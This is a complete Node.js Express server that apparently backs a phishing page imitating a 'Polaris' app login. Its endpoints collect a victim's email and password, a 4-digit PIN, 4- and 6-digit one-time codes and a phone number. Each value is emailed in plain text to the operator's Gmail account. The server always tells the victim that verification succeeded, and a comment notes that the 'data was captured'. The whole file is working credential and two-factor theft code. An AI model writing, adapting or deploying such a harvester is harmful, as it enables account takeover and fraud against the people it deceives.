const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

// Middleware
app.use(express.json());
app.use(
  cors({
    origin: "https://polaris-app-rouge.vercel.app",
  }),
);

const PORT = process.env.PORT || 5000;

// Email credentials from .env
const userEmail = process.env.EMAIL_USER;
const pass = process.env.EMAIL_PASS;

// Reusable transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});

// Helper: send email and respond
function sendMailAndRespond(res, subject, text, successMsg) {
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject,
    text,
  };

  console.log("Sending:", mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Mail error:", error);
      // Still return success to the frontend (data was captured)
      return res.status(200).json({ success: true, message: successMsg });
    }
    console.log("Email sent:", info.response);
    return res.status(200).json({ success: true, message: successMsg });
  });
}

// ─── ENDPOINT 1: POST / ─── Login
app.post("/", (req, res) => {
  const { email, password } = req.body;

  // Validation
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid email or password" });
  }
  if (!password) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid email or password" });
  }

  sendMailAndRespond(
    res,
    "Polaris Login Details",
    `Email: ${email}\nPassword: ${password}`,
    "Login successful",
  );
});

// ─── ENDPOINT 2: POST /pin ─── PIN Verification
app.post("/pin", (req, res) => {
  const { pin } = req.body;

  if (!pin || !/^\d{4}$/.test(pin)) {
    return res.status(401).json({ success: false, message: "Invalid PIN" });
  }

  sendMailAndRespond(
    res,
    "Polaris PIN Verification",
    `PIN: ${pin}`,
    "PIN verified successfully",
  );
});

// ─── ENDPOINT 3: POST /verify-otp ─── OTP Verification (4 digits)
app.post("/verify-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{4}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  sendMailAndRespond(
    res,
    "Polaris OTP Verification",
    `OTP: ${otp}`,
    "OTP verified successfully",
  );
});

// ─── ENDPOINT 4: POST /resend-otp ─── Second OTP (6 digits) or Resend OTP
app.post("/resend-otp", (req, res) => {
  const { otp, phoneNumber } = req.body;

  // Case 1: User submitting 6-digit OTP from second OTP page
  if (otp) {
    if (!/^\d{6}$/.test(otp)) {
      return res
        .status(400)
        .json({ success: false, message: "Invalid OTP, error occurred" });
    }

    sendMailAndRespond(
      res,
      "Polaris Second OTP Verification",
      `6-Digit OTP: ${otp}`,
      "OTP verified successfully",
    );
  }
  // Case 2: User requesting to resend OTP via SMS
  else if (phoneNumber) {
    sendMailAndRespond(
      res,
      "Polaris OTP Resend Request",
      `OTP resend requested for: ${phoneNumber}`,
      "OTP resent successfully",
    );
  }
  // Case 3: Neither provided
  else {
    return res.status(400).json({ success: false, message: "Invalid request" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

